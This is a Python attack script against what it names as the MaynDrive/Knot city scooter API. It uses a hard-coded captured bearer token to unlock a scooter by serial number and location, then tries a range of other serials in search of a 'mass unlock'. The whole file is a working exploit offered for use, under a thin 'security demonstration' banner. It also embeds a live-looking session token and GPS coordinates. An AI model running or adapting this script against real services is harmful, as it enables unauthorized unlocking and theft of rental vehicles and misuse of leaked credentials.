#!/usr/bin/env python3
"""
MaynDrive Attack Script - SUCCESSFUL VERSION
Confirmed working with TUF061 unlock!
"""

import requests
import json
import time
from datetime import datetime

# WORKING CREDENTIALS
BEARER_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI5MzY1MTQ5Yi1lZDdkLTQ1Y2MtYTZiMi1lYTU0NmMyOWE2NGUiLCJpYXQiOjE3NTk0NDQxMDcsImV4cCI6MTc1OTQ0NzcwN30.ge09yj7PfvFgPeJsQmmfcm74YuQaU-dAgxtW21q-LHY"

BASE_URL = "https://api.knotcity.io"
UNLOCK_ENDPOINT = "/api/application/vehicles/unlock"
LOCK_ENDPOINT = "/api/application/vehicles/freefloat/lock"

HEADERS = {
    "Authorization": BEARER_TOKEN,
    "Content-Type": "application/json",
    "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
    "Accept": "application/json"
}

# WORKING SCOOTER DATA
WORKING_SCOOTER = {
    "serial": "TUF061",
    "lat": 47.39027698832425,
    "lng": 0.6889144890010357
}

# Test more scooters
TEST_SCOOTERS = [
    "TUF061",  # ✅ CONFIRMED WORKING
    "TUF062",  # ❌ Permission denied (real scooter)
    "TUF063",  # Test
    "TUF064",  # Test
    "TUF065",  # Test
    "TUF066",  # Test
    "TUF067",  # Test
    "TUF068",  # Test
    "TUF069",  # Test
    "TUF070",  # Test
]

def unlock_scooter(serial, lat, lng):
    """Unlock a scooter"""
    print(f"🔓 Unlocking scooter: {serial}")
    print(f"   Location: {lat}, {lng}")
    
    payload = {
        "serial_number": serial,
        "lat": lat,
        "lng": lng
    }
    
    try:
        response = requests.post(f"{BASE_URL}{UNLOCK_ENDPOINT}", 
                               headers=HEADERS, 
                               json=payload, 
                               timeout=15)
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print("✅ UNLOCK SUCCESSFUL!")
            return True
        elif response.status_code == 403:
            print("❌ Permission denied (real scooter, no access)")
            return False
        else:
            print(f"❌ Unlock failed - Status: {response.status_code}")
            return False
            
    except requests.exceptions.Timeout:
        print("⏰ Request timed out (might be real scooter)")
        return False
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

def lock_scooter(vehicle_id, pass_id=None):
    """Lock a scooter"""
    print(f"🔒 Locking scooter: {vehicle_id}")
    if pass_id:
        print(f"   Using Pass ID: {pass_id}")
    
    payload = {
        "vehicle_id": vehicle_id
    }
    
    if pass_id:
        payload["pass_id"] = pass_id
    
    try:
        response = requests.post(f"{BASE_URL}{LOCK_ENDPOINT}", 
                               headers=HEADERS, 
                               json=payload, 
                               timeout=15)
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print("✅ LOCK SUCCESSFUL!")
            return True
        else:
            print(f"❌ Lock failed - Status: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

def test_multiple_scooters():
    """Test multiple scooters to find accessible ones"""
    print("🎯 Testing multiple scooters...")
    print("=" * 60)
    
    accessible_scooters = []
    
    for serial in TEST_SCOOTERS:
        print(f"\n--- Testing {serial} ---")
        success = unlock_scooter(serial, WORKING_SCOOTER["lat"], WORKING_SCOOTER["lng"])
        
        if success:
            accessible_scooters.append(serial)
            print(f"🎉 {serial} is ACCESSIBLE!")
            
            # Try to lock it
            time.sleep(2)
            print(f"Testing lock for {serial}...")
            lock_scooter(serial)
        
        time.sleep(2)  # Wait between attempts
    
    print(f"\n🎯 SUMMARY:")
    print(f"Accessible scooters: {accessible_scooters}")
    return accessible_scooters

def demonstrate_attack():
    """Demonstrate the complete attack"""
    print("🚨 SECURITY VULNERABILITY DEMONSTRATION")
    print("=" * 60)
    print("⚠️  WARNING: This demonstrates a real security flaw!")
    print("=" * 60)
    
    # Step 1: Unlock the working scooter
    print("\n🔓 STEP 1: Unlock scooter using captured credentials")
    success = unlock_scooter(WORKING_SCOOTER["serial"], 
                           WORKING_SCOOTER["lat"], 
                           WORKING_SCOOTER["lng"])
    
    if success:
        print("✅ ATTACK SUCCESSFUL - Scooter unlocked!")
        
        # Step 2: Try to lock it
        print("\n🔒 STEP 2: Attempt to lock the scooter")
        time.sleep(3)
        lock_scooter(WORKING_SCOOTER["serial"])
        
        # Step 3: Test other scooters
        print("\n🎯 STEP 3: Test other scooters for mass unlock")
        time.sleep(2)
        test_multiple_scooters()
    
    else:
        print("❌ Attack failed - scooter not accessible")

def main():
    print("=" * 60)
    print("🚨 MAYNDRIVE SECURITY EXPLOITATION - SUCCESSFUL")
    print("=" * 60)
    print("✅ CONFIRMED: TUF061 unlock successful!")
    print("⚠️  WARNING: This is a real security vulnerability!")
    print("=" * 60)
    
    print("\n🎯 OPTIONS:")
    print("1. Demonstrate complete attack")
    print("2. Test multiple scooters")
    print("3. Test lock functionality")
    print("4. Exit")
    
    while True:
        try:
            choice = input("\nSelect option (1-4): ").strip()
            
            if choice == "1":
                demonstrate_attack()
                    
            elif choice == "2":
                test_multiple_scooters()
                
            elif choice == "3":
                vehicle_id = input("Enter vehicle_id to lock: ").strip()
                pass_id = input("Enter pass_id (optional): ").strip() or None
                lock_scooter(vehicle_id, pass_id)
                
            elif choice == "4":
                print("👋 Goodbye!")
                break
                
            else:
                print("Invalid choice. Please select 1-4.")
                
        except KeyboardInterrupt:
            print("\n👋 Goodbye!")
            break
        except Exception as e:
            print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
